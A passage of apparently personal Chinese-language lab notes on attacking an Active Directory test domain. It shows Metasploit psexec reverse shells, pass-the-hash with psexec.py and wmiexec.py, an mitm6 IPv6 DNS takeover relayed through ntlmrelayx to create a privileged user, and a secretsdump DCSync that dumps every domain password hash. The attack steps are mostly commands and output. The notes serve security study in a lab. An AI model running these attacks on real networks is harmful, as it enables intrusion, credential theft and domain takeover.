Name</span><br><span class="line">    --  ----</span><br><span class="line">=&gt;  0   Automatic</span><br><span class="line">    1   PowerShell</span><br><span class="line">    2   Native upload</span><br><span class="line">    3   MOF upload</span><br><span class="line">    4   Command</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.149:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.19.149:445 - Authenticating to 192.168.19.149:445|MARVEL.<span class="built_in">local</span> as user <span class="string">&#x27;fcastle&#x27;</span>...</span><br><span class="line">[*] 192.168.19.149:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.19.149:445 - Executing the payload...</span><br><span class="line">[+] 192.168.19.149:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.19.149</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.149:60647) at 2024-02-19 10:44:11 -0500</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果遇到Service failed to start - ACCESS_DENIED的情況，記得先去關閉目標機器防毒及防火牆</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; **background** <span class="comment">#session available to us, if end up doing an host</span></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt;</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **sessions** </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                        Connection</span><br><span class="line">  --  ----  ----                     -----------                        ----------</span><br><span class="line">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ THEPUNISHER  192.168.19.130:4444 -&gt; 192.168.19.149:60647 (192.168.19.149)</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **sessions 1**</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **background**</span><br><span class="line">[*] Backgrounding session 1...</span><br></pre></td></tr></table></figure>

<p>在進行後利用時，我們可能會遇到需要執行其他任務的情況，例如測試不同的利用，或執行權限升級利用。在這種情況下，我們需要將目前的 Meterpreter 會話置於背景。我們可以透過發出background命令來做到這一點</p>
<p>接下來要進行NTLM attack </p>
<ul>
<li>設定成local user</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbuser administrator**</span><br><span class="line">smbuser =&gt; administrator</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">unset</span> smbdomain**</span><br><span class="line">Unsetting smbdomain...</span><br><span class="line">[!] Variable <span class="string">&quot;smbdomain&quot;</span> <span class="built_in">unset</span> - but will use a default value still. If this is not desired, <span class="built_in">set</span> it to a new value or attempt to clear it with <span class="built_in">set</span> --clear smbdomain</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>將之前透過<strong>ntlmrelayx.py</strong>找到的憑證資訊</p>
<p>複製管理員的hash &gt; aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                           lm    <span class="built_in">hash</span>                      nt <span class="built_in">hash</span></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:388347163f7f36db1640f63ff0e9e374:::</span><br><span class="line">peterparker:1001:aad3b435b51404eeaad3b435b51404ee:9d45c944752dc08356c32926dbd53bb1:::</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03**</span><br><span class="line">smbpass =&gt; aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.149:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.19.149:445 - Authenticating to 192.168.19.149:445 as user <span class="string">&#x27;administrator&#x27;</span>...</span><br><span class="line">[*] 192.168.19.149:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.19.149:445 - Executing the payload...</span><br><span class="line">[+] 192.168.19.149:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (176198 bytes) to 192.168.19.149</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.19.130:4444 -&gt; 192.168.19.149:60690) at 2024-02-19 12:03:54 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>set this exploit and execute it, and we get a shell on the machine</p>
<p>next thing that we can do is we can actually do this with a hash instead</p>
<p>intstead of utilizing a password or an account</p>
<ul>
<li>dump the SAM on an account or a computer</li>
</ul>
<p>utilize in similar fashion and still get a shell on</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **psexec.py MARVEL/fcastle:<span class="string">&#x27;Password1&#x27;</span>@192.168.19.149**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 192.168.19.149.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file RgNLATKC.exe</span><br><span class="line">[*] Opening SVCManager on 192.168.19.149.....</span><br><span class="line">[*] Creating service yjGh on 192.168.19.149.....</span><br><span class="line">[*] Starting service yjGh.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.19045.4046]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line">**psexec.py marvel.local/fcastle:<span class="string">&#x27;Password1&#x27;</span>@IP</span><br><span class="line">psexec.py administrator@IP -hashes sf3t32t4t3tg4434tvvfehva34342...** <span class="comment">#not need to crack hash, then can utilize this to elevate further or get into this machine just using hash</span></span><br></pre></td></tr></table></figure>

<p>另一種方法，指令輸入後再輸入目標機器密碼</p>
<p><img src="/img/ADInitial_Untitled_20.png" alt="Untitled"></p>
<p>或是貼上hash</p>
<p><img src="/img/ADInitial_Untitled_21.png" alt="Untitled"></p>
<p>如果psexec不動作或被防毒擋下</p>
<p>執行如下命令取得目標系統192.168.19.149的shell：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/121330635">https://blog.csdn.net/qq_44159028&#x2F;article&#x2F;details&#x2F;121330635</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **wmiexec.py** **administrator@192.168.19.149 -hashes aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03**</span><br><span class="line"><span class="comment">#wmiexec.py 使用者名稱:密碼@目標IP</span></span><br><span class="line"><span class="comment">#如果對wmiexec.py指定-hashes的話，則可進行哈希傳遞</span></span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes LM Hash:NT Hash 網域/使用者名稱@目標IP // 哈希傳遞取得shell</span><br><span class="line">wmiexec.py -hashes LM Hash:NT Hash 網域/使用者名稱@目標IP <span class="string">&quot;ipconfig&quot;</span> // 執行指令</span><br></pre></td></tr></table></figure>

<p>WMI是由一系列工具集組成的，可以在本地或遠端管理電腦系統</p>
<p>自從PsExec在內網中被嚴格監控後，越來越多的防毒廠商將PsExec加入了黑名單，於是攻擊者逐漸開始使用WMI進行橫向移動。</p>
<p>在使用wmiexec進行橫向移動時，<strong>Windows作業系統預設不會將WMI的操作記錄在日誌中</strong>，同時攻擊腳本無需寫入磁碟，具有極高的隱蔽性。</p>
<p>使用WMIC連接遠端主機，需要目標主機開放135和445連接埠。 (135埠是WMIC預設的管理端,wimcexec使用445埠傳回顯示) 即需要目標關閉防護牆才行。</p>
<p><strong>利用WMI可以進行資訊收集、探測、防毒、虛擬機器偵測、指令執行、權限持久化等操作。</strong></p>
<h2 id="IPv6-Attacks-Overview"><a href="#IPv6-Attacks-Overview" class="headerlink" title="IPv6 Attacks Overview"></a><strong>IPv6 Attacks Overview</strong></h2><p><a target="_blank" rel="noopener" href="https://medium.com/@huseyin.eksi/how-to-ipv6-dns-takeover-via-mitm6-24b64dac2db5">https:&#x2F;&#x2F;medium.com&#x2F;@huseyin.eksi&#x2F;how-to-ipv6-dns-takeover-via-mitm6-24b64dac2db5</a></p>
<p><a target="_blank" rel="noopener" href="https://redfoxsec.com/blog/ipv6-dns-takeover/">https://redfoxsec.com/blog/ipv6-dns-takeover/</a></p>
<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html">https://websec.readthedocs.io/zh/latest/auth/ntlm.html</a></p>
<p><strong>連接埠 389 (LDAP) 是開放的</strong>，這意味著我們的目標很容易受到攻擊。 IPv6 DNS 接管不會與特定連接埠號碼綁定。</p>
<p>利用此功能來獲得對網路的控制，並可能從網域控制器中存在的 ntds.dit 轉儲 NTLM 雜湊值。 ntds.dit 檔案是一個資料庫，用於儲存有關網域中所有使用者的使用者物件、群組和群組成員身分以及密碼雜湊的資訊。</p>
<ul>
<li>如果攻擊者的系統能夠擷取 IPv6 流量，則它有可能<em>攔截驗證請求並奪取 NTLM 憑證</em></li>
<li>使用<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a>等工具將這些憑證中繼到網域控制器</li>
<li>如果受損的驗證請求來自網域管理員，攻擊者就可以利用這些 NTLM 憑證在網域內偽造使用者帳戶供自己使用</li>
<li>mitm6 等工具可以自動促進此過程</li>
<li>如果攻擊者使用<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/mitm6">mitm6</a>冒充 DNS 伺服器，他們可以提取關鍵的 AD 資料並自動在受害者的網域中建立帳戶</li>
<li>這是由使用者重新啟動其端點或登入以及其他操作觸發的</li>
</ul>
<p>Windows 喜歡 IPv6 而不是 IPv4。如果網路中尚未使用 IPv6，這使我們能夠使用 mitm6 執行 DNS 接管。執行此攻擊時，還可以透過欺騙 WPAD 位置並要求身份驗證以使用我們的惡意代理，使電腦帳戶和使用者透過 HTTP 向我們進行身份驗證。</p>
<p><img src="/img/ADInitial_Untitled_22.png" alt="Untitled"></p>
<p><strong>There are three parts to this attack:</strong></p>
<ol>
<li>IPv6 DNS Spoofing</li>
<li>Relaying Credentials</li>
<li>DC Sync Attack</li>
</ol>
<p>mitm6是一個滲透測試工具，它利用Windows的預設配置來接管預設的DNS伺服器。它透過回覆 DHCPv6 訊息、為受害者提供鏈路本地 IPv6 位址並將攻擊者主機設定為預設 DNS 伺服器來實現此目的。</p>
<p>如果還沒下載mitm6</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/mitm6</span><br><span class="line"><span class="built_in">sudo</span> pip2 install .</span><br></pre></td></tr></table></figure>

<p>充當 ipv6 dns 伺服器，將這些客戶端資料包中繼到 DC。ntlmrelayx 工具為 WPAD 檔案提供服務，然後將身份驗證中繼到網路中的其他伺服器。</p>
<p>ntlmrelayx 中繼了  <strong>MARVEL\THEPUNISHER$</strong> 憑證，並使用它來收集 AD 資訊並將其保存到 loot 目錄中。在這個目錄中，有很多事情正在發生。使用者、群組、信任……</p>
<p>執行所謂的 LDAP 中繼。我們使用此 NTLM 憑證透過 LDAP 中繼到網域控制器，如果它是網域控制器的網域管理員，我們就會登入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local -l lootme**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line"></span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line"><span class="comment">#等待一段時間...</span></span><br><span class="line"></span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.150, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: /wpad.dat</span><br><span class="line">[*] HTTPD: Serving PAC file to client ::ffff:192.168.19.150</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: /wpad.dat</span><br><span class="line">[*] HTTPD: Serving PAC file to client ::ffff:192.168.19.149</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: go.microsoft.com:443</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span><br><span class="line">[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt</span><br><span class="line">....</span><br><span class="line">[*] HTTPD: Client requested path: geo.prod.do.dsp.mp.microsoft.com:443</span><br><span class="line">[*] HTTPD: Client requested path: geo.prod.do.dsp.mp.microsoft.com:443</span><br><span class="line">**[*] Authenticating against ldaps://192.168.19.140 as MARVEL\THEPUNISHER$ SUCCEED**</span><br><span class="line">[*] Enumerating relayed user<span class="string">&#x27;s privileges. This may take a while on large domains</span></span><br><span class="line"><span class="string">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span></span><br><span class="line"><span class="string">[*] HTTPD: Client requested path: cp501.prod.do.dsp.mp.microsoft.com:443</span></span><br><span class="line"><span class="string">[*] HTTPD: Received connection from ::ffff:192.168.19.149, attacking target ldaps://192.168.19.140</span></span><br><span class="line"><span class="string">....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="string">└─# mitm6 -d marvel.local #執行上面命令同時運行這條命令-攻擊從使用開始</span></span><br><span class="line"><span class="string">Starting mitm6 using the following configuration:</span></span><br><span class="line"><span class="string">Primary adapter: eth0 [00:0c:29:76:77:35]</span></span><br><span class="line"><span class="string">IPv4 address: 192.168.19.130</span></span><br><span class="line"><span class="string">IPv6 address: fe80::20c:29ff:fe76:7735</span></span><br><span class="line"><span class="string">DNS local search domain: marvel.local</span></span><br><span class="line"><span class="string">DNS allowlist: marvel.local</span></span><br><span class="line"><span class="string">IPv6 address fe80::3662:1 is now assigned to mac=00:0c:29:3a:b2:da host=SPIDERMAN.MARVEL.local. ipv4=</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.MARVEL.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.marvel.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:1</span></span><br><span class="line"><span class="string">IPv6 address fe80::3662:2 is now assigned to mac=00:0c:29:34:b5:e7 host=THEPUNISHER.MARVEL.local. ipv4=</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.MARVEL.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">Sent spoofed reply for wpad.marvel.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">Sent spoofed reply for fakewpad.marvel.local. to fe80::3662:2</span></span><br><span class="line"><span class="string">IPv6 address fe80::3662:3 is now assigned to mac=00:0c:29:34:b5:e7 host=THEPUNISHER.MARVEL.local. ipv4=</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>Address already in use</p>
<p>  There is probably another server&#x2F;process running on port <code>445</code><br>  check with <code>netstat</code></p>
</li>
</ul>
<p>到THEPUN…機器reboot</p>
<p>當我們重新啟動機器時，<strong>重新啟動的機器將觸發事件</strong>，該事件將傳遞給我們。我們可以使用該機器登入網域控制器，它不必是管理員或其他任何東西，我們可以獲取信息，大量資訊只是我們可以使用該機器來創建另一台機器</p>
<p>等待某人登入網路或在某個地方使用他們的憑證，它會以 NTLM 的形式到達我們，就像回應程式、SMB 中繼一樣</p>
<p>再來看到執行命令的那個目錄下新增了一個lootme目錄，打開可以看到所有捕捉到的資訊</p>
<p><img src="/img/ADInitial_Untitled_23.png" alt="Untitled"></p>
<p>可以通過查看目錄中的文件得知收集到的資訊</p>
<p><img src="/img/ADInitial_Untitled_24.png" alt="Untitled"></p>
<p>開啟THEPUN…機器，<strong>登入MARVEL\administrator - Akali@<strong>，同時回到kali看到</strong>ntlmrelayx.py的回傳資訊</strong></p>
<p>然後它將開始為我們設定一個<strong>存取控制列表</strong>，然後它將為我們<strong>建立一個新用戶。</strong></p>
<p><img src="/img/ADInitial_Untitled_25.png" alt="Untitled"></p>
<ul>
<li>user - rkxJHDREXh</li>
<li>password - 3ng-\mbLt,pf&amp;&#96;<ul>
<li>後來為了方便登入到網域控制站修改密碼成Password123</li>
</ul>
</li>
</ul>
<p><img src="/img/ADInitial_Untitled_26.png" alt="Untitled"></p>
<p>可以到Domain Control - Winser2022那台機器查看新增進網域得用戶</p>
<p><img src="/img/ADInitial_Untitled_27.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local**</span><br><span class="line">....</span><br><span class="line">TypeName: &#123;<span class="string">&#x27;ACCESS_ALLOWED_ACE&#x27;</span>&#125;</span><br><span class="line">[*] User privileges found: Adding user to a privileged group (Enterprise Admins)</span><br><span class="line">[*] User privileges found: Modifying domain ACL</span><br><span class="line">[*] Attempting to create user <span class="keyword">in</span>: CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">[*] Adding new user with username: **rkxJHDREXh** and password: **3ng-\mbLt\,pf&amp;`** result: OK</span><br><span class="line">[*] Querying domain security descriptor</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>LDAP 中繼攻擊利用 NTLM 驗證，其中執行 NTLM 驗證請求，攻擊者會擷取憑證並將其中繼到網域控制器，並利用此攻擊 LDAP。</p>
<p>預設情況下，如果沒有 LDAP 簽章和通道綁定</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -6 -t ldaps://192.168.19.140 -wh fakewpad.marvel.local --escalate-user rkxJHDREXh**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line"></span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br></pre></td></tr></table></figure>

<p>開啟在THEPUNISHER的MARVEL\administrator管理員PC，開啟網頁回連攻擊者IP，輸入網域管理員帳密</p>
<p><img src="/img/ADInitial_Untitled_28.png" alt="Untitled"></p>
<p>回到攻擊機會看到請求憑證且網域管理員成功提交憑證的情況。ntlmrelayx.py接收憑證並將其轉送到192.168.19.140上的網域控制站</p>
<p><img src="/img/ADInitial_Untitled_29.png" alt="Untitled"></p>
<p>成功授予了使用者rkxJHDREXh DCSync權限，這權限可用於轉儲網域雜湊</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">DCSync</a></p>
<p>能夠用來匯出網域內所有使用者的hash</p>
<p>取得以下任一使用者的權限：</p>
<ul>
<li>Administrators群組內的用戶</li>
<li>Domain Admins群組內的用戶</li>
<li>Enterprise Admins群組內的用戶</li>
<li>網域控制器的電腦帳戶</li>
</ul>
<p>目前已經利用使用者<strong>rkxJHDREXh</strong>這個使用者，新增一個自創的user以及密碼，並且加入domain的群組以及access control list裡，能夠取得網域的存取權，就能利用secretdumps.py將NTLM的雜湊值秀出來。</p>
<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10334933?sc=rss.iron">https://ithelp.ithome.com.tw/articles/10334933?sc=rss.iron</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **secretsdump.py security/rkxJHDREXh:<span class="string">&#x27;Password123&#x27;</span>@192.168.19.140**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">**Administrator**:500:aad3b435b51404eeaad3b435b51404ee:**9d45c944752dc08356c32926dbd53bb1**:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1b456f97efef406dee89974015626837:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:1106:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:1107:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:1108:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:1109:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">rkxJHDREXh:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br><span class="line">QdPzdMZFFY:1113:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:e0c93e5a908bb49faae6dfbd441315df:::</span><br><span class="line">THEPUNISHER$:1110:aad3b435b51404eeaad3b435b51404ee:609d022bd903186011475412b886ff21:::</span><br><span class="line">SPIDERMAN$:1111:aad3b435b51404eeaad3b435b51404ee:01c7256f418aea90038f747850c6d948:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:3da82460f8089089d3314faf97ec14b57bb931d1abfccc56adf4be5ac17c6259</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:0de5a75905ec51897be4388e72c27449</span><br><span class="line">Administrator:des-cbc-md5:0732ec109becd040</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:4dc8552c0a9af84790609f003ba7a70ec6b491d6d1f3e01720fff2a52c3f228d</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:fe2417c127e815bfa48e7ed4fa00cf8a</span><br><span class="line">krbtgt:des-cbc-md5:6defd0cb3ec7d070</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:aes256-cts-hmac-sha1-96:ab81738c8877605c6d5e41b248b8fb25a6861db2ceb3eba713903f6ce1f55ad5</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:aes128-cts-hmac-sha1-96:81dfeee30c05797ea3bbf70d341174b5</span><br><span class="line">MARVEL.<span class="built_in">local</span>\tstark:des-cbc-md5:760bd3dc1008d046</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:aes256-cts-hmac-sha1-96:85c7a4e514f4c892eb31967428ba18dcf9b449d1c24991cbe82432ac0f7916a9</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:aes128-cts-hmac-sha1-96:af7bda1d251a8d4fb369f7166c72e4e1</span><br><span class="line">MARVEL.<span class="built_in">local</span>\SQLService:des-cbc-md5:466d67c21cb0ad9b</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9</span><br><span class="line">MARVEL.<span class="built_in">local</span>\fcastle:des-cbc-md5:4fa7ad454cc78954</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:aes256-cts-hmac-sha1-96:0d7bd2a7f6fbcf31dc0c4abd58cd55cea02d1c86c6772f26e138488a2e839a4a</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:aes128-cts-hmac-sha1-96:b7b6bd12fcf153fb0b51766c84f47641</span><br><span class="line">MARVEL.<span class="built_in">local</span>\pparker:des-cbc-md5:e3528615016e0b97</span><br><span class="line">rkxJHDREXh:aes256-cts-hmac-sha1-96:8218f7b233caf2e2f7a2a2d86367e5b1e4ab78f1ed48b423e43009dff77f8323</span><br><span class="line">rkxJHDREXh:aes128-cts-hmac-sha1-96:22de0cd4724454fcbd7ed741fb61febd</span><br><span class="line">rkxJHDREXh:des-cbc-md5:a76ea8250de04631</span><br><span class="line">QdPzdMZFFY:aes256-cts-hmac-sha1-96:64dc5aa7106d14705052204f76100bee110356467a16ea7ec442cebcc5c12680</span><br><span class="line">QdPzdMZFFY:aes128-cts-hmac-sha1-96:924b369654df526e6842dce4406b8eef</span><br><span class="line">QdPzdMZFFY:des-cbc-md5:2ac2495807f4a71a</span><br><span class="line">HYDRA-DC$:aes256-cts-hmac-sha1-96:c52c1c7f63cc12e42639e444fc462daa30a71b7dd0c255556b190cc0bd98d669</span><br><span class="line">HYDRA-DC$:aes128-cts-hmac-sha1-96:4c66fcbcb744f6ad0fa2b4d761b26f2d</span><br><span class="line">HYDRA-DC$:des-cbc-md5:40929e25ad6b984c</span><br><span class="line">THEPUNISHER$:aes256-cts-hmac-sha1-96:9ded7fd16e2e7743b7dca545fc8422d2a6e169e149c027af3ccb70e78dd40d4f</span><br><span class="line">THEPUNISHER$:aes128-cts-hmac-sha1-96:3ee5adf6770842e23b987eb2549d8917</span><br><span class="line">THEPUNISHER$:des-cbc-md5:20985b6b79d389b0</span><br><span class="line">SPIDERMAN$:aes256-cts-hmac-sha1-96:abe971b3932ad2d364994ffd86558a42d04eef8766886ebe2e27435a009cc0c2</span><br><span class="line">SPIDERMAN$:aes128-cts-hmac-sha1-96:f23d6a55d4425c1f5d0300db132ec742</span><br><span class="line">SPIDERMAN$:des-cbc-md5:32643bcd198c6e64</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<p>雜湊值可以用於密碼破解，也可以用於身分驗證</p>
